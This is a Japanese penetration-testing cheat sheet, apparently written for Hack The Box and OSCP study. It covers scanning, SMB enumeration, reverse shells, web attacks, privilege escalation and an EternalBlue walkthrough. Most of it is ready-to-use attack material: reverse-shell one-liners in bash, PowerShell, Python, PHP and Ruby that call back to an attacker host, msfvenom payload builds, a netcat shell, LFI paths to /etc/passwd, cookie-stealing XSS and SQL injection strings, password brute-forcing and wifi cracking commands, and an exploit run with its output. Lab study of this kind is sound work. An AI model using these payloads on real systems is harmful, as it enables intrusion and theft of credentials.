# ペネトレーションテスト用チートシート
Hack The Boxの攻略やOSCPの取得を目指して、まとめているチートシートです。  
随時更新して成長していきます。

<img src="http://www.hackthebox.eu/badge/image/185549" alt="Hack The Box">

Twitter:@yukitsukai1731

## 目次

- [Network Scan](#Network_scan)
  - [Nmap](#nmap)
- [WebScan](#Web_scan)
  - [Gobster](#Gobuster)
  - [Nikto](#Nikto)
  - [WPScan](#WPScan)
  - [BurpSuite](#BurpSute)
- [SMB Scan](#SMB_scan)
  - [smbclient](#smbclient)
  - [impacket](#impacket)
    - [impacket-smbserver](#impacket-smbserver)
  - [smbmap](#smbmap)
  - [enum4linux](#enum4linux)
- [侵入](#侵入)
  - [reverse_shell](#reverse_shell)
    - [Bash](#Bash)
    - [Powershell](#Powershell)
    - [Python](#Python)
    - [PHP](#PHP)
    - [Ruby](#Ruby)
    - [msfvenom_reverse_shell](#msfvenom_reverse_shell)
      - [Windows(meterpreter)](#Windows(meterpreter))
      - [Windows(netcatなど)](#Windows(netcatなど))
      - [Linux](#Linux)
      - [PHP(msfvenom)](#PHP(msfvenom))
      - [ASP(msfvenom)](#ASP(msfvenom))
      - [JSP(msfvenom)](#JSP(msfvenom))
      - [WAR(msfvenom)](#WAR(msfvenom))
      - [Python(msfvenom)](#Python(msfvenom))
      - [Bash(msfvenom)](#Bash(msfvenom))
      - [Perl(msfvenom)](#Perl(msfvenom))
      - [Handlers](#Handlers)
  - [Webアプリケーション](#Webアプリケーション)
      - [LFI](#lfi)
      - [XSS](#xss)
      - [SQLインジェクション](#sqlインジェクション)
        - [sqlmap](#sqlmap)
- [特権エスカレーション](#特権エスカレーション)
  - [metasploit local_exploit_suggester](#metasploit(local_exploit_suggester))
  - [Windows](#windows)
    - [windows-exploit-suggester](#windows-exploit-suggester)
    - [evilwinrm](#evilwinrm)
  - [Linux](#linux)
    - [linux-exploit-suggester](#linux-exploit-suggester)
    - [SUID](#SUID)
  - [HTTP/HTTPS Servers](#httpserver)
  - [Wordlist](#wordlist)
  - [Default Passwords](#default-passwords)
- [その他](#その他)
  - [MS17-010(EternalBlue)](#MS17-010(EternalBlue))
  - [ツールまとめ](#ツールまとめ)
    - [NetCat](#netcat)
    - [JohnTheRipper](#johntheripper)
    - [hydra](#hydra)
    - [searchsploit](#searchsploit)
    - [aircrack-ng](#aircrack-ng)
  - [未分類](#未分類)
    - [ssh](#ssh)
      - [sshトンネリング](#sshトンネリング)
      - [ssh-keygen](#ssh-keygen)
    - [ftp](#ftp)
    - [mysql](#mysql) 


# Network_scan

## Nmap
ポートスキャンツール。  
対象の情報を得るためのまず第一歩。  
2つ目のスキャンは時間がかかるため、並行してスキャンする。

```
nmap -sC -sV -Pn -oN <output filename> <target ip>
nmap -sC -sV -Pn -p- -oN <output filename> <target ip>
```

- -sC...デフォルトスクリプトでスキャン
- -sV...バージョン検出
- -Pn...ping送信をせずにスキャン
- -oN...ファイルへ出力
- -p-...全ポートをスキャン(時間がかかる)

脆弱性の基本的な調査を行うために「--script vuln」オプションを追加する

```
nmap -A -Pn -p- --script vuln <target ip>
```

## 個別に有名なSMBの脆弱性の調査をしたい時
これを用いてMS08-067やMS17-010などを検出

```
nmap -script smb-vuln* -p 139,445 <target ip>
```

### NSEスクリプトが配置されているディレクトリ
```
/usr/share/nmap/scripts
```

```検索
ls | grep smb
```

# Web_scan

## Gobuster
ディレクトリスキャナー。  
隠されたディレクトリや公開範囲が間違えて設定されているものはないかを調べるために使用。

```
gobuster dir -t 100 -u <target url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,py -o <output filename>
```

- dir...ディレクトリ総当たり
- -t...スレッド数
- -u...URL指定
- -w...wordlistの指定
- -o...ファイル出力
- -x...拡張子指定

## Nikto
Webサーバスキャナー。  
Webサイトを調査し悪用可能な脆弱性の検出を行う。

```
nikto -h <target url> -Format txt -o <output filename>
```
- -h...url指定
- -Format...出力するファイルの拡張子を指定
- -o...ファイルへ出力する
- -ssl...SSLを使用するサイトで使用


## WPScan
WordPressの脆弱性診断ツール。

```
wpscan -url <target url> -e u -t -vp --log <output filename>
```

- -url...対象のURL指定
- -e u...usernameの列挙
- -t...テーマを列挙
- -vp...脆弱性のあるプラグインを列挙
- --log...ファイル出力

## BurpSuite
ローカルプロキシツール。  
通信の改ざんをするために使用。  
他にもXSSやSQLインジェクションなどの脆弱性を発見するために使う。  
LFIなどを利用する時にも使用。  

![スクリーンショット 2020-06-08 14.01.26.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/9fa84891-db19-8f3c-eb87-c1e7777a3fce.png)


# SMB_Scan

## smbclient

匿名ログインが有効になっているかの確認。

```
smbclient -L <target ip>
```

# impacket
ネットワークプロトコルを操作するためにPythonクラスのコレクション。  
SMB1-3やMSRPCなどのプロトコル実装自体を提供することに重点を置いている。  
ツールを利用する以外にもよくexploitに使われているので、インストールしておく必要がある。

```
git clone https://github.com/SecureAuthCorp/impacket.git
pip install .
```

## impacket-smbserver
対象サーバにツールを送り込む際に使用。  
主にnetcatもpowershellも使えないようなときに使う。  

```
python3 /usr/share/doc/python3-impacket/examples/smbserver.py temp <共有するディレクトリ>
```

```
C:\WINDOWS\system32>\\<smbserverを立ち上げたIPアドレス>\temp\whoami.exe
```

## smbmap
ドメイン全体のsamba共有ドライブを列挙するために使用。
```
smbmap -u <username> -p <password> -H <target host ip>
```

## enum4linux
WindowsおよびSambaホストからのデータを列挙するためのツール。

```
enum4linux -U -o <target ip>
```

- -U...ユーザリスト取得
- -o...OS情報取得

# 侵入

## reverse_shell

### Bash
```
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

### Powershell
```
function reverse_powershell {
    $client = New-Object System.Net.Sockets.TCPClient("10.0.0.1",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
}
```

```
powershell -ExecutionPolicy bypass -command "Import-Module reverse.ps1; reverse_powershell"
```

### Python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```


### PHP
```
php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Ruby
```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## msfvenom reverse_shell
#### Windows(meterpreter)
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443  EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe
```
#### Windows(netcatなど)
```
msfvenom -p windows/shell_reverse_tcp lhost=10.0.0.1 lport=4444 –f exe > reverse.exe
```

#### Linux
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o reverse.elf
```

#### PHP(msfvenom)
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Port Number> -f raw > reverse.php
```

#### ASP(msfvenom)

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f asp > reverse.asp
```

#### JSP(msfvenom)
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.jsp
```

#### WAR(msfvenom)
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f war > reverse.war
```

#### Python(msfvenom)
```
msfvenom -p cmd/unix/reverse_python LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.py
```
#### Bash(msfvenom) 
```
msfvenom -p cmd/unix/reverse_bash LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.sh
```
#### Perl(msfvenom)
```
msfvenom -p cmd/unix/reverse_perl LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.pl
```

#### Handlers
```
use exploit/multi/handler
set payload <payload>
set LHOST <ip address>
set LPORT <port number>
run
```

## Webアプリケーション
### LFI
LFIの脆弱性を見つけたら、BurpSuiteなどを用いて通信の改ざんを行い、/etc/passwdディレクトリなどを覗き、ユーザー一覧の確認を行う。
```
http://<target ip>/script.php?page=../../../../../../../../etc/passwd
http://<target ip>/script.php?page=../../../../../../../../etc/hosts
```

### XSS
攻撃者が作成した不正なスクリプトを脆弱性のあるWebアプリケーションを利用して閲覧者に実行させる攻撃。
```
'';!--"<XSS>=&{()}``\"
```

```
<script>alert(1);</script>
```

```
"><script>alert(1);</script>
```

aタグを使用
```
<a onmouseover="alert(document.cookie)">XSS</a>
```
iframeを使用
```
<iframe src="javascript:alert('XSS');"></iframe>
```
エンコードされたURIスキームを介してスクリプトを使用したXSS
```
<IMG SRC=j&#X41vascript:alert('XSS')>
```

### SQLインジェクション
データベースシステムを不正に操作する攻撃。  
不正ログインや個人情報の漏洩、Webサイトの改ざんが行われてしまう。  
```
' OR 'a'='a
```
#### SQLmap

```
sqlmap -u http://192.168.56.1/vuln.php?id=1
```

--user-agentオプション。
Firefoxをユーザーエージェントとして使用することでフィルターをバイパスする。
```
sqlmap -u http：//192.168.0.1/vuln.php?id=1 --user-agent "Mozilla / 5.0（X11; Linux x86_64; rv：60.0 ）Gecko / 20100101 Firefox / 60.0 "
```

# 特権エスカレーション
### metasploit(local_exploit_suggester)
exploitをせずに脆弱性をチェックするために使用するモジュール。
meterpreterでシェルを取得している場合、これを使うことで特権昇格に使えるexploitを簡単に探すことができる。

```
use post/multi/recon/local_exploit_suggester
```
## windows
### windows-exploit-suggester
windowsでexploitを列挙するためのスクリプト
systeminfoコマンドの出力が必要
```
./windows-exploit-suggester.py --update
pip install xlrd
```

```
systeminfo > systeminfo.txt
./windows-exploit-suggester.py –database 2020-06-08-mssb.xls –systeminfo systeminfo.txt
```

## evlilwinrm
WinRM(Windowsリモート管理)を利用したペンテスト特化ツール。  
5985ポートが空いている時に使用。

### インストール

```
gem install evil-winrm
```

### 使い方

```
evil-winrm -u <username> -p <password> -i <remote host ip>
```

## linux
### linux-exploit-suggester
linuxで特権昇格の脆弱性を列挙するためのスクリプト

```
./linux-exploit-suggester.pl
```

### SUID
Linuxでは、SUIDビットが有効になっている場合、既存のバイナリとコマンドの一部をroot以外のユーザーが使用して、rootアクセス権限を昇格させることができる。
まずはSUIDファイルを見つける。
下記のコマンドを実行するとSUIDアクセス許可を物全てのバイナリを列挙することができる。

```
find / -perm -u=s -type f 2>/dev/null
```

- /は、ファイルシステムの先頭（ルート）から開始し、すべてのディレクトリを検索
- -permは、後続の権限の検索
- -u=sは、rootユーザーが所有するファイルを検索
- -typeは、探しているファイルの種類を示します
- fは、ディレクトリや特殊ファイルではなく、通常のファイルを示す
- 2はプロセスの2番目のファイル記述子であるstderr（標準エラー）を示す
- &gt;はリダイレクトを意味する
- /dev/nullは、書き込まれたすべてのものを破棄する特別なファイルシステムオブジェクト


# httpserver
攻撃者マシンでのサーバ立ち上げ。

```
python -m SimpleHTTPServer <ポート番号>
python3 -m http.server <ポート番号>
```


# wordlists
direbusterやwifiパスワードなどのリスト集。
```
/usr/share/wordlists/
```

# default-passwords
機器に設定されているデフォルトパスワードのリスト集。
```
/usr/share/metasploit-framework/data/wordlists/
```

# その他

## MS17-010(EternalBlue)
エクスプロイトに必要なものを準備
この最後のmysmb.pyをダウンロードしておかないと、ImportError：mysmbと警告が出る。

```
wget https://www.exploit-db.com/raw/42315
mv 42315 eternalblue.py
wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
```

次にimpacketもインストールしておかないと使うことができないので入っていない場合は落としておく。

```
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip install .
```

もしもここでpipが入っていないと警告が出た場合は、

```
sudo apt install python-pip
```
をして、pipもインストール。

次にリバースシェルに使うペイロードをmsfvenomを利用して作成

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.11 LPORT=1234 -f exe > reverse.exe
```

次にeternalblue.pyのソースコードを変更してエクスプロイトに使用できるようにする。
まずUSERNAMEのところを下記の画像のように変更。

![スクリーンショット 2020-06-15 17.04.43.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/375fcd67-ae03-1b86-3641-9ba2fc3ec5d0.png)

次にsmb_pwn関数内のスクリプトを下記の画像のように変更。

![スクリーンショット 2020-06-15 17.06.47.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/2ff690c1-adf5-20a0-5d7c-066e6ebd711b.png)

これで準備は完了
通信を受けるためにnetcatで待ち受けておく。

```
nc -lvp 1234
```

最後にeternalblue.pyを実行

```
┌─[✗]─[yukitsukai@parrot]─[~/htb/Blue]
└──╼ $python eternalblue.py 10.10.10.40 ntsvcs
Target OS: Windows 7 Professional 7601 Service Pack 1
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa8001af9560
SESSION: 0xfffff8a001bf5de0
.
.
.
ServiceExec Error on: 10.10.10.40
nca_s_proto_error
Done
```
すると、通信を待ち受けていたnetcatの方でシェルが取得できる。

![スクリーンショット 2020-06-15 17.01.52.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/88c8a374-bd9e-5b18-36d6-f0c6b3f048ca.png)



## ツールまとめ
## netcat
NetcatはTCP/UDPの各プロトコルと通信することができる万能ツール。

通信待ち受け
```
nc -nlvp <port number>
```
- -n...DNSによる名前解決を行わない
- -l...リッスンモード
- -v...標準メッセージの出力
- -p...ポートの指定

通信の接続
```
nc -nv <target ip> <port number>
```

### reverse_shell
netcatで通信を待ち受けつつ、対象から以下のコマンドを入力
```
nc -nv <attack machine ip> <port number> -e cmd.exe
```

netcatで待ち受けつつ、python・ruby・bash・phpなどを用いてreverse_shellに使うことができる。  

## johntheripper
パスワードハッシュ解析ツール。  
例えばzipなら以下のようにすることで解析可能
```
./zip2john test.zip > test.hash
./john test.hash
```

## hydra
sshやftpなどの認証をパスワードクラックするためのツール。  
主にユーザ名が判明しているときや誤って公開されているパスワードリストなどが判明したときに使用。  
```
hydra -l <username or user.txt> -p <password or password.txt> 192.168.56.1 -t 4 ssh
```

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.1 http-post-form "/login:username=^USER^&password=^PASS^:F=failed"
```

## searchsploit
Exploit-dbを即座に検索できるツール。
```
searchsploit <keyword>
```

ターミナル上でコードを閲覧。
```
searchsploit - searchsploit -m windows/remote/39161.py
```

ローカルにコードやテキストをダウンロード。  
これでexploit用スクリプトをダウンロードする。
```
searchsploit -m searchsploit -m windows/remote/39161.py
```

## aircrack-ng
```
airmon-ng start wlan0
iwaconfig
airodump-ng wlan0mon
```

```
airodump-ng --channel 対象のチャンネル --bssid APのMACアドレス -w <output filename> wlan0mon
```

```
aircrack-ng <filename>.cap
```

# 未分類
## ssh
リモートコンピュータと通信するためのプロトコル。
```
ssh <username>@<target ip>
```

### SSHトンネリング
ファイアウォールを超えて外部から目的サーバにアクセス可能。
```
ssh -L 8080:127.0.0.1:80 <username>@<target ip>
```

### ssh-keygen
kaliで作成したものを対象のサーバに配置することでsshでアクセスする権限を奪取する。

```
ssh-keygen -t rsa -f id_rsa
```


## ftp
ファイル転送プロトコル。
```
ftp <target ip>
```
ファイルのアップロード。  
anonymousログインなどが可能で、ファイルをアップロードできるような状態であればreverse_shellに利用できる可能性がある。
```
ftp > put <filename>
```

ファイルのダウンロード.
```
ftp > get <filename>
```


## mysql
ログイン
```
mysql -u <username> -p
mysql -u <username> -p -h <host name> -P <port number>
```

データベース一覧の表示
```
mysql > show databases;
```

データベースの追加
```
mysql > create database sample_db;
```

テーブル一覧の表示
```
mysql > show tables;
```

ユーザ情報取得
```
SELECT Host, User, Password FROM mysql.user;
```

ユーザの追加
```
create user <追加するusername>@<host name> IDENTIFIED BY <password>;
```

権限付与
```
grant all privileges on test_db.* to <username>@<host name> IDENTIFIED BY <password>;
```

